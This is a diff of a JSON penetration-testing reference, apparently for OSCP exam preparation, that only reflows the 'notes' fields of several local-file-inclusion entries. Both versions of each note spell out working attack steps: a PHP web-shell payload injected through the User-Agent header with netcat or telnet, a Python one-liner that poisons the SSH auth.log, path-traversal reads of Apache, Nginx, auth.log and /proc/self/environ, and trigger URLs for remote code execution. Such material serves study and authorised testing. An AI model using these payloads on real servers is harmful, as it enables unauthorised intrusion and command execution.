@@ -45,7 +45,7 @@
         "Log not readable (permissions issue)",
         "Empty log file or permission denied on LFI read"
       ],
-      "notes": "Manual alternative: Use netcat to send raw HTTP request: echo -e 'GET / HTTP/1.1\\r\\nHost: <TARGET>\\r\\nUser-Agent: <?php system($_GET[\"c\"]); ?>\\r\\n\\r\\n' | nc <TARGET> <PORT>. Timing: 1-2 minutes for poisoning. Add 2-3 minutes for LFI trigger and shell upgrade. Total: 3-5 minutes. Success rate: High (70-80% when LFI confirmed and logs accessible).",
+      "notes": "Manual alternative:\nUse netcat to send raw HTTP request:\necho -e 'GET / HTTP/1.1\\r\\nHost:\n<TARGET>\\r\\nUser-Agent:\n<?php system($_GET[\"c\"]); ?>\\r\\n\\r\\n' | nc <TARGET> <PORT>.\n\nTiming:\n1-2 minutes for poisoning.\n\nAdd 2-3 minutes for LFI trigger and shell upgrade.\n\nTotal:\n3-5 minutes.\n\nSuccess rate:\nHigh (70-80% when LFI confirmed and logs accessible).",
       "next_steps": [
         "Trigger RCE: curl 'http://<TARGET>/page.php?file=../../../../var/log/apache2/access.log&c=whoami'",
         "Verify execution: Look for command output in response (often buried in log noise)",
@@ -93,7 +93,7 @@
         "If permission denied: Try error.log instead (often more permissive)"
       ],
       "category": "web",
-      "notes": "Manual alternative: Raw HTTP via netcat (same as Apache variant). Or use telnet: telnet <TARGET> <PORT>, then manually type: GET / HTTP/1.1<ENTER>Host: <TARGET><ENTER>User-Agent: <?php system($_GET[\"c\"]); ?><ENTER><ENTER> Success rate: Medium-High (60-70%). Lower than Apache because: (1) Nginx admins more likely to customize log format, (2) SELinux/AppArmor more common on Nginx setups, (3) User-Agent logging sometimes disabled for performance. Higher success on default Nginx installs. Timing: 2-3 minutes (slightly longer than Apache due to path/user enumeration). Add 1 minute for initial Nginx vs Apache detection.",
+      "notes": "Manual alternative:\nRaw HTTP via netcat (same as Apache variant).\n\nOr use telnet:\ntelnet <TARGET> <PORT>, then manually type:\nGET / HTTP/1.1<ENTER>Host:\n<TARGET><ENTER>User-Agent:\n<?php system($_GET[\"c\"]); ?><ENTER><ENTER> Success rate:\nMedium-High (60-70%).\n\nLower than Apache because:\n(1) Nginx admins more likely to customize log format, (2) SELinux/AppArmor more common on Nginx setups, (3) User-Agent logging sometimes disabled for performance.\n\nHigher success on default Nginx installs.\n\nTiming:\n2-3 minutes (slightly longer than Apache due to path/user enumeration).\n\nAdd 1 minute for initial Nginx vs Apache detection.",
       "alternatives": [],
       "success_indicators": [],
       "failure_indicators": [],
@@ -147,7 +147,7 @@
         "Alternative technique: /proc/self/environ if all logs fail"
       ],
       "category": "web",
-      "notes": "Manual alternative: Use browser: Navigate to http://<TARGET>/<LFI_PARAM>?<PARAM>=../../../../var/log/apache2/access.log directly. Advantage: See formatted output with syntax highlighting extensions. Disadvantage: Browser modifies User-Agent (harder to control payload injection). For exam: curl preferred (scriptable, exact control). Success rate: Medium (50-60%). Many modern setups restrict log permissions (640 root:adm). Default Apache on older Ubuntu (<=16.04) often world-readable (644). OSCP boxes tend toward permissive configs for challenge purposes. Timing: 30 seconds to 1 minute (quick verification step before poisoning).",
+      "notes": "Manual alternative:\nUse browser:\nNavigate to http://<TARGET>/<LFI_PARAM>?<PARAM>=../../../../var/log/apache2/access.log directly.\n\nAdvantage:\nSee formatted output with syntax highlighting extensions.\n\nDisadvantage:\nBrowser modifies User-Agent (harder to control payload injection).\n\nFor exam:\ncurl preferred (scriptable, exact control).\n\nSuccess rate:\nMedium (50-60%).\n\nMany modern setups restrict log permissions (640 root:adm).\n\nDefault Apache on older Ubuntu (<=16.04) often world-readable (644).\n\nOSCP boxes tend toward permissive configs for challenge purposes.\n\nTiming:\n30 seconds to 1 minute (quick verification step before poisoning).",
       "alternatives": [],
       "success_indicators": [],
       "failure_indicators": [],
@@ -201,7 +201,7 @@
         "Nginx-specific alternative: /var/log/nginx/<VHOST>.access.log (dot separator used by some configs)"
       ],
       "category": "web",
-      "notes": "Manual alternative: Browser-based testing (same as Apache). For multi-vhost enumeration: Use gobuster/wfuzz to fuzz vhost names, then try /var/log/nginx/<VHOST>_access.log. Example: wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://<TARGET>/index.php?file=../../../../var/log/nginx/FUZZ_access.log' --hh 0 Success rate: Medium (50-60%, similar to Apache). Nginx advantage: error.log often 644 permissions (more permissive than Apache error.log which is typically 640). Timing: 1 minute (includes Nginx detection + log path enumeration).",
+      "notes": "Manual alternative:\nBrowser-based testing (same as Apache).\n\nFor multi-vhost enumeration:\nUse gobuster/wfuzz to fuzz vhost names, then try /var/log/nginx/<VHOST>_access.log.\n\nExample:\nwfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://<TARGET>/index.php?file=../../../../var/log/nginx/FUZZ_access.log' --hh 0 Success rate:\nMedium (50-60%, similar to Apache).\n\nNginx advantage:\nerror.log often 644 permissions (more permissive than Apache error.log which is typically 640).\n\nTiming:\n1 minute (includes Nginx detection + log path enumeration).",
       "alternatives": [],
       "success_indicators": [],
       "failure_indicators": [],
@@ -239,7 +239,7 @@
         "If output not visible: Log noise high in auth.log - grep for your IP to find relevant section"
       ],
       "category": "web",
-      "notes": "Manual alternative: If SSH client rejects PHP payload (some clients validate username format): Use raw TCP socket. Python one-liner: python3 -c \"import socket; s=socket.socket(); s.connect(('<TARGET>',22)); s.recv(1024); s.send(b'SSH-2.0-OpenSSH_8.0\\r\\n'); s.send(b'<?php system(\\$_GET[\\\"c\\\"]); ?>\\r\\n')\" (less reliable but bypasses client validation). Success rate: High (70-80% when SSH exposed and auth.log readable). Advantages over web log poisoning: (1) auth.log often group-readable (syslog group), (2) less likely to have SELinux restrictions, (3) works even if no web server running. Disadvantages: (1) Requires SSH port open, (2) generates failed login alerts (stealth concern in real engagements, not OSCP). Timing: 1-2 minutes for poisoning. 30 seconds for SSH detection (nmap). Total: 2-3 minutes.",
+      "notes": "Manual alternative:\nIf SSH client rejects PHP payload (some clients validate username format):\nUse raw TCP socket.\n\nPython one-liner:\npython3 -c \"import socket; s=socket.socket(); s.connect(('<TARGET>',22)); s.recv(1024); s.send(b'SSH-2.0-OpenSSH_8.0\\r\\n'); s.send(b'<?php system(\\$_GET[\\\"c\\\"]); ?>\\r\\n')\" (less reliable but bypasses client validation).\n\nSuccess rate:\nHigh (70-80% when SSH exposed and auth.log readable).\n\nAdvantages over web log poisoning:\n(1) auth.log often group-readable (syslog group), (2) less likely to have SELinux restrictions, (3) works even if no web server running.\n\nDisadvantages:\n(1) Requires SSH port open, (2) generates failed login alerts (stealth concern in real engagements, not OSCP).\n\nTiming:\n1-2 minutes for poisoning.\n\n30 seconds for SSH detection (nmap).\n\nTotal:\n2-3 minutes.",
       "alternatives": [],
       "success_indicators": [],
       "failure_indicators": [],
@@ -293,7 +293,7 @@
         "RHEL/CentOS variant: Try /var/log/secure instead of auth.log"
       ],
       "category": "web",
-      "notes": "Manual alternative: Browser-based or use wget: wget -q -O - 'http://<TARGET>/<LFI_PARAM>?<PARAM>=../../../../var/log/auth.log' (wget advantage: saves to file for offline analysis). Success rate: Medium-High (60-70%). auth.log often more permissive than web logs. Default permissions: 640 root:adm, but www-data sometimes in adm group (Ubuntu Server default) or syslog group. Timing: 30 seconds (quick verification).",
+      "notes": "Manual alternative:\nBrowser-based or use wget:\nwget -q -O - 'http://<TARGET>/<LFI_PARAM>?<PARAM>=../../../../var/log/auth.log' (wget advantage:\nsaves to file for offline analysis).\n\nSuccess rate:\nMedium-High (60-70%).\n\nauth.log often more permissive than web logs.\n\nDefault permissions:\n640 root:adm, but www-data sometimes in adm group (Ubuntu Server default) or syslog group.\n\nTiming:\n30 seconds (quick verification).",
       "alternatives": [],
       "success_indicators": [],
       "failure_indicators": [],
@@ -351,7 +351,7 @@
         "If fails: Check /proc/self/fd/ directory (alternative proc technique)"
       ],
       "category": "web",
-      "notes": "Manual alternative: Two-step approach using telnet: (1) telnet <TARGET> <PORT>, (2) Manually type: GET /<LFI_PARAM>?<PARAM>=../../../../proc/self/environ HTTP/1.1<ENTER>Host: <TARGET><ENTER>User-Agent: <?php system($_GET[\"c\"]); ?><ENTER><ENTER>. Same result, more control over exact request format. Success rate: Medium (50-60%). Works when: (1) /proc filesystem mounted, (2) PHP not in strict safe_mode. Fails when: (1) Docker/container with --security-opt no-new-privileges, (2) /proc mounted with hidepid=2 option (paranoid security), (3) PHP CGI mode (different process context). Success rate lower than log poisoning but critical fallback. Timing: 2-3 minutes (includes understanding /proc output format). Faster if familiar with technique.",
+      "notes": "Manual alternative:\nTwo-step approach using telnet:\n(1) telnet <TARGET> <PORT>, (2) Manually type:\nGET /<LFI_PARAM>?<PARAM>=../../../../proc/self/environ HTTP/1.1<ENTER>Host:\n<TARGET><ENTER>User-Agent:\n<?php system($_GET[\"c\"]); ?><ENTER><ENTER>.\n\nSame result, more control over exact request format.\n\nSuccess rate:\nMedium (50-60%).\n\nWorks when:\n(1) /proc filesystem mounted, (2) PHP not in strict safe_mode.\n\nFails when:\n(1) Docker/container with --security-opt no-new-privileges, (2) /proc mounted with hidepid=2 option (paranoid security), (3) PHP CGI mode (different process context).\n\nSuccess rate lower than log poisoning but critical fallback.\n\nTiming:\n2-3 minutes (includes understanding /proc output format).\n\nFaster if familiar with technique.",
       "alternatives": [],
       "success_indicators": [],
       "failure_indicators": [],
@@ -412,7 +412,7 @@
         "URL encode complex commands: Use Burp Decoder or: python3 -c 'import urllib.parse; print(urllib.parse.quote(\"<COMMAND>\"))'"
       ],
       "category": "web",
-      "notes": "Manual alternative: Browser-based for simple commands: Navigate to http://<TARGET>/<LFI_PARAM>?<PARAM>=../../../../var/log/apache2/access.log&c=whoami. For complex commands (reverse shells with special chars): Use Burp Suite Repeater to avoid URL encoding issues. Best practice: URL-encode <COMMAND> for reliability (bash -c becomes bash%20-c). Success rate: Very High (90-95% after successful poisoning). Main failure point is earlier (poisoning/log access), not execution. If you reach this step, RCE almost guaranteed unless PHP restrictions present. Timing: 30 seconds per command test. 2-3 minutes for reverse shell establishment.",
+      "notes": "Manual alternative:\nBrowser-based for simple commands:\nNavigate to http://<TARGET>/<LFI_PARAM>?<PARAM>=../../../../var/log/apache2/access.log&c=whoami.\n\nFor complex commands (reverse shells with special chars):\nUse Burp Suite Repeater to avoid URL encoding issues.\n\nBest practice:\nURL-encode <COMMAND> for reliability (bash -c becomes bash%20-c).\n\nSuccess rate:\nVery High (90-95% after successful poisoning).\n\nMain failure point is earlier (poisoning/log access), not execution.\n\nIf you reach this step, RCE almost guaranteed unless PHP restrictions present.\n\nTiming:\n30 seconds per command test.\n\n2-3 minutes for reverse shell establishment.",
       "alternatives": [],
       "success_indicators": [],
       "failure_indicators": [],
